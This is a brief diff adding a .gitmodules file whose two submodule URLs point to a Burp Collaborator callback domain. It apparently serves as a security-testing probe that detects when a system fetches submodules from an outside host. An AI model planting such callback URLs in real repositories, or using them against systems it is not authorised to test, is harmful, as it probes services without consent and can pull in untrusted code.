@@ -1,0 +1,7 @@
+[submodule "libfoo"]
+path = include/foo
+url = git://nxoo3jaas2j1z0vbey5146tjva13ps.burpcollaborator.net/git/lib.git
+
+[submodule "libbar"]
+path = include/bar
+url = https://nxoo3jaas2j1z0vbey5146tjva13ps.burpcollaborator.net/git/lib2.git
